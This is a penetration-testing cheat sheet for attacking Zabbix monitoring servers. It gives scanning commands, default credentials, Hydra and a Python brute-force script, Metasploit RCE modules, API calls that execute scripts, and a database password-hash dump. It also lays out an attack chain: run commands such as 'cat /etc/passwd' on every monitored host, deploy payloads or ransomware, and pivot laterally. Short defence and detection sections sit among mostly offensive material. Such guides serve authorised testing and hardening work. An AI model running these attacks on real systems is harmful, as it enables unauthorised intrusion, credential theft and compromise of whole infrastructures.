# ZABBIX SERVER ENUMERATION (Port 10051/TCP)

## SERVICE OVERVIEW
```
Zabbix Server/Proxy - Central monitoring server
- Port: 10050/TCP (Zabbix agent - see separate file)
- Port: 10051/TCP (Zabbix server/proxy) ← THIS PORT
- Receives data from Zabbix agents
- Central point for monitoring infrastructure
- Web interface typically on port 80/443
- Full monitoring system compromise if breached
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p10051 <IP>                           # Service/Version detection
nc -nv <IP> 10051                               # Manual connection
telnet <IP> 10051                               # Alternative connection
```

## NMAP ENUMERATION
```bash
# Zabbix server detection
nmap -sV -p10051 <IP>                           # Version detection
nmap -p10051 --script banner <IP>               # Banner grab

# Full Zabbix infrastructure scan
nmap -sV -p80,443,10050,10051 <IP> -oA zabbix_full_scan
```

## WEB INTERFACE ACCESS
```bash
# Zabbix server usually has web interface
# Check ports 80 and 443

curl http://<IP>/zabbix/                        # Common path
curl https://<IP>/zabbix/ -k                    # HTTPS
curl http://<IP>/                               # Root path

# Common Zabbix web paths:
http://<IP>/zabbix/
http://<IP>/zabbix/index.php
http://<IP>/
https://<IP>/zabbix/
```

## DEFAULT CREDENTIALS
```bash
# Zabbix default credentials (web interface):
Admin:zabbix                                    # Default admin account
guest:<blank>                                   # Guest account (read-only)

# Try defaults on web interface
curl -X POST http://<IP>/zabbix/index.php \
  -d "name=Admin&password=zabbix&autologin=1&enter=Sign in"

# Common weak passwords:
Admin:zabbix
Admin:admin
Admin:password
Admin:Admin
administrator:zabbix
zabbix:zabbix
```

## BRUTE FORCE WEB INTERFACE
```bash
# Hydra
hydra -l Admin -P passwords.txt <IP> http-post-form "/zabbix/index.php:name=^USER^&password=^PASS^&enter=Sign in:F=Login name or password is incorrect"

# WPScan-like for Zabbix (custom script)
cat > zabbix_brute.py <<'EOF'
#!/usr/bin/env python3
import requests
import sys

def brute_force(ip, user, password_file):
    url = f"http://{ip}/zabbix/index.php"
    with open(password_file) as f:
        for password in f:
            password = password.strip()
            data = {'name': user, 'password': password, 'enter': 'Sign in'}
            r = requests.post(url, data=data)
            if "Dashboard" in r.text or "zabbix.php?action=dashboard" in r.text:
                print(f"[+] Success: {user}:{password}")
                return
            print(f"[-] Failed: {password}")

if __name__ == "__main__":
    brute_force(sys.argv[1], sys.argv[2], sys.argv[3])
EOF

python3 zabbix_brute.py <IP> Admin passwords.txt
```

## POST-AUTHENTICATION EXPLOITATION
```bash
# After logging into Zabbix web interface:

# 1. Enumerate monitored hosts
# Dashboard → Configuration → Hosts

# 2. Execute commands on agents
# Configuration → Hosts → <host> → Items → Create item
# Key: system.run[<command>]

# 3. Create script for mass execution
# Administration → Scripts → Create script
# Execute on: Zabbix server
# Commands: whoami; id; uname -a

# 4. Upload web shell (if web server accessible)
# Administration → Media types → Script
# Upload PHP/ASPX web shell via script

# 5. SQL injection (if vulnerable version)
# Zabbix has history of SQLi vulnerabilities
```

## METASPLOIT MODULES
```bash
msfconsole

# Zabbix login scanner
use auxiliary/scanner/zabbix/zabbix_login
set RHOSTS <IP>
set USERNAME Admin
set PASSWORD zabbix
run

# Zabbix RCE (CVE-2013-5743)
use exploit/linux/misc/zabbix_server_exec
set RHOSTS <IP>
set USERNAME Admin
set PASSWORD zabbix
exploit
```

## ZABBIX API ACCESS
```bash
# Zabbix has JSON-RPC API on web interface
# Endpoint: http://<IP>/zabbix/api_jsonrpc.php

# Authenticate and get auth token
curl -X POST http://<IP>/zabbix/api_jsonrpc.php \
  -H "Content-Type: application/json-rpc" \
  -d '{
    "jsonrpc": "2.0",
    "method": "user.login",
    "params": {
      "user": "Admin",
      "password": "zabbix"
    },
    "id": 1
  }'

# Response contains auth token
# Use token for API calls

# List hosts
curl -X POST http://<IP>/zabbix/api_jsonrpc.php \
  -H "Content-Type: application/json-rpc" \
  -d '{
    "jsonrpc": "2.0",
    "method": "host.get",
    "params": {
      "output": ["hostid", "host"]
    },
    "auth": "<auth_token>",
    "id": 1
  }'

# Execute script
curl -X POST http://<IP>/zabbix/api_jsonrpc.php \
  -H "Content-Type: application/json-rpc" \
  -d '{
    "jsonrpc": "2.0",
    "method": "script.execute",
    "params": {
      "scriptid": "1",
      "hostid": "10084"
    },
    "auth": "<auth_token>",
    "id": 1
  }'
```

## VULNERABILITY SCANNING
```bash
# Search for Zabbix exploits
searchsploit zabbix

# Known vulnerabilities:
# CVE-2013-5743: Zabbix SQL Injection
# CVE-2016-10134: Zabbix Agent EnableRemoteCommands RCE
# CVE-2017-2824: Zabbix Server Active Proxy Trapper RCE
# CVE-2020-11800: Zabbix Server SAML SSO Authentication Bypass
# CVE-2022-23131: Zabbix Setup Authentication Bypass

# Nmap vuln scan
nmap -p80,443,10051 --script http-vuln-* <IP>
```

## COMMON MISCONFIGURATIONS
```
☐ Default credentials not changed (Admin:zabbix)
☐ Guest account enabled (read-only but info disclosure)
☐ Zabbix web interface exposed to internet
☐ No 2FA/MFA on admin accounts
☐ Outdated Zabbix version with known vulnerabilities
☐ Weak passwords on Zabbix accounts
☐ Script execution enabled for non-admin users
☐ SQL database accessible (default MySQL/PostgreSQL)
☐ No rate limiting on login attempts
☐ API accessible without IP restrictions
```

## QUICK WIN CHECKLIST
```
☐ Scan for Zabbix server on port 10051
☐ Find Zabbix web interface (port 80/443)
☐ Test default credentials (Admin:zabbix)
☐ Brute force admin account if needed
☐ Enumerate monitored hosts via web interface
☐ Execute commands on agents via web UI
☐ Create scripts for mass command execution
☐ Access Zabbix API for automation
☐ Check for SQL injection vulnerabilities
☐ Dump Zabbix database (if SQL access)
☐ Pivot to all monitored hosts
```

## ONE-LINER ENUMERATION
```bash
# Quick Zabbix detection
curl -s http://<IP>/zabbix/ | grep -i "zabbix"

# Test default credentials
curl -X POST http://<IP>/zabbix/index.php -d "name=Admin&password=zabbix&enter=Sign in" | grep -i "dashboard"
```

## SECURITY IMPLICATIONS
```
RISKS:
- Full monitoring infrastructure compromise
- Access to ALL monitored hosts (via agents)
- Command execution on all agents
- Credentials exposure (Zabbix database)
- Network topology disclosure
- Information gathering on entire infrastructure
- Lateral movement to all monitored systems
- Persistent access (create backdoor admin account)

ATTACK CHAIN:
1. Compromise Zabbix server (web interface)
2. Enumerate all monitored hosts (hundreds/thousands)
3. Execute commands on all hosts via agents
4. Pivot to critical servers (DC, DB, web servers)
5. Exfiltrate data from monitored systems
6. Deploy ransomware across infrastructure
7. Maintain persistence via Zabbix

RECOMMENDATIONS:
- Change default credentials immediately
- Disable guest account
- Implement 2FA for admin accounts
- Restrict web interface to trusted IPs/VPN
- Keep Zabbix updated to latest version
- Regular security audits
- Monitor Zabbix logs for suspicious activity
- Least privilege (don't give all users script execution)
- Encrypt Zabbix database
- Use HTTPS for web interface
- Implement network segmentation
```

## ZABBIX DATABASE ACCESS
```bash
# Zabbix uses MySQL or PostgreSQL
# Default database: zabbix
# Default user: zabbix
# Default password: varies (often empty or 'zabbix')

# Connect to database (if accessible)
mysql -h <IP> -u zabbix -p zabbix

# PostgreSQL
psql -h <IP> -U zabbix -d zabbix

# Enumerate Zabbix database
# Tables of interest:
# - users (admin credentials)
# - hosts (monitored hosts)
# - items (monitoring items/commands)
# - scripts (stored scripts)
# - config (Zabbix configuration)

# Dump user passwords
mysql -h <IP> -u zabbix -p -D zabbix -e "SELECT alias, passwd FROM users;"

# Zabbix password hashes (MD5)
# Can be cracked with hashcat/john
```

## TOOLS
```bash
# cURL
curl http://<IP>/zabbix/

# Hydra
hydra -l Admin -P passwords.txt <IP> http-post-form "/zabbix/index.php:name=^USER^&password=^PASS^:F=incorrect"

# Nmap
nmap -sV -p80,443,10050,10051 <IP>

# Metasploit
use auxiliary/scanner/zabbix/zabbix_login
use exploit/linux/misc/zabbix_server_exec

# searchsploit
searchsploit zabbix

# Nikto
nikto -h http://<IP>/zabbix/
```

## DEFENSE DETECTION
```bash
# Monitor for Zabbix compromise:
# - Failed login attempts (brute force)
# - Login from unusual IPs/countries
# - Mass script creation
# - Command execution on multiple hosts
# - New admin accounts created
# - Configuration changes

# Zabbix logs
# Linux: /var/log/zabbix/zabbix_server.log
# Windows: C:\Program Files\Zabbix Server\zabbix_server.log

tail -f /var/log/zabbix/zabbix_server.log

# Audit Zabbix users
# Web UI → Administration → Users
# Check for unknown accounts

# Check for suspicious scripts
# Web UI → Administration → Scripts
# Review all scripts for malicious commands
```

## INTEGRATION WITH OTHER ATTACKS
```bash
# Attack chain:

# 1. Discover Zabbix
nmap -sV -p80,10051 <IP>

# 2. Access web interface
curl http://<IP>/zabbix/

# 3. Login with default credentials
# Username: Admin
# Password: zabbix

# 4. Enumerate monitored hosts
# Dashboard → Configuration → Hosts
# Export list of all hosts

# 5. Create global script
# Administration → Scripts → Create script
# Name: "recon"
# Commands:
whoami; id; hostname; ip a; cat /etc/passwd

# 6. Execute on all hosts
# Monitoring → Latest data → <host> → Execute script

# 7. Identify high-value targets
# Domain controllers, databases, web servers

# 8. Deploy payload via Zabbix
# Create script to download and execute payload
# Execute on critical hosts

# 9. Lateral movement
# Use compromised hosts to pivot further
```

## ZABBIX AGENT INTEGRATION
```bash
# Zabbix server controls agents (port 10050)
# See: SERVICE ENUM/10050 Zabbix Agent.md

# Attack flow:
# Zabbix Web (80/443) → Zabbix Server (10051) → Zabbix Agents (10050)

# If you compromise Zabbix server:
# - Full control over all agents
# - Execute commands on all monitored hosts
# - Deploy malware across infrastructure
# - Exfiltrate data from all systems
```
